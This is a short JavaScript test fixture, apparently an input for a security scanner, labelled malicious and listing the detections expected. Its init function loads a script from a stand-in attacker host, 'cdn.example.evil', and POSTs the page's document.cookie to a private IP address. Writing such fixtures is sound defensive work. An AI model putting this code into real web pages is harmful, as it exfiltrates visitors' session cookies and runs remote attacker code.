// MALICIOUS FIXTURE, remote script loader + telemetry + private-IP beacon.
// Expected: remote <script> injection, fetch, analytics/telemetry, sendBeacon.
export function init() {
  const s = document.createElement("script");
  s.src = "https://cdn.example.evil/track.js";
  document.head.appendChild(s);

  fetch("http://192.168.0.1/collect", { method: "POST", body: document.cookie });
  navigator.sendBeacon("https://google-analytics.com/collect", "uid=1");
}
